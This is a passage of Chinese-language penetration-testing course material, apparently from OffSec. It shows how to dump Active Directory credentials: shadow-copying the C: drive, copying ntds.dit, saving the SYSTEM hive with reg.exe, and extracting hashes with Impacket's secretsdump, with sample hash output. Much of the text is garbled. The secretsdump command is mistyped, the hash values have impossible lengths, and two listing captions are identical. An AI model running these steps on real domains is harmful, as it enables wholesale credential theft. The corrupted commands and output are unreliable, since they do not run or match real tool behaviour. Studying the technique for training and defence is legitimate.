

# OffSec

基于 Kali Linux 的渗透测试

- 未公开
- 提供程序 ID: {b5946137-7b9f-4925-a8bd-51abd60b20d5}
- 属性: Auto_Release_No_Writers Differential 

快照创建日期。

> 列表 862 - 对整个 C 盘执行卷复制

一旦成功创建快照，我们需要该卷复制的名称。

现在，我们将通过指定卷复制名称和完整的 ntds.dit 路径，将 AD 数据库从卷复制复制到 C: 盘根目录。

```
C:\Tools copy \\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit
c:\ntds.dit
1 file(s) copied.
```

> 列表 863 - 将 ntds 数据复制到 c 盘

作为最后一步，为了提取 ntds.dit 的内容，我们需要从 Windows 注册表中保存 SYSTEM 单元格（hive）。我们可以使用 `reg` 工具实现这一点并保存该参数。

```
C:\reg.exe save hklm\system system.hiv
The operation completed successfully.
```

> 列表 864 - 将 ntds 数据复制到 c 盘

一旦这两个文件移动到我们的 Kali 机器，我们就可以使用套件中的 `secretsdump` 工具继续提取凭据。我们将分别提供 ntds 数据和系统单元格（`-ntds` 和 `-system`），以及 `LOCAL KEY` 来解析所在的文件。

```
kal@kali:-$ import secrets-dump -ntds ntds.dit -system hive LOCAL
Impacket v0.10 - Copyright 2022 SecureAuth Corporation
```

```
[*] Dumping server bootkey: 0xbe66044ef8775695ae9bd216561dc0628
[*] Dumping Domains Credentials (domain:uid: lm:hash:nthash)
[*] Searching for, password
[*] PEK & #0 hash: 90d28b2135de63d0113fc4af92d965ac53
[*] Reading and extracting ntds.dit from hive
Admins:1500:a33b43b514404eae4:a2ed42b31b504eae4:2892d2c6f7d4a70e2eb9b5f0c4ae25:
Guest:1500:a33b43b514404eae4:31d6de6f812e16a93b317cc7377a4f5c2fe2:
dav:1300:a33b43b514404eae4:a2e85c677f5a1186057377a4f5c2fe2:
krbt5:502:a33b43b514404eae4:66b5e4f4c3111e669ecfaffac77f1a1234d718847f4:
stephanie:1104:a33b43b514404eae4:80d8a7a4f9f76b9b31a4b71488777494:
jafferson:1233:a33b43b514404eae4:a6e65069d3550592276d0b9931237744a4:
```

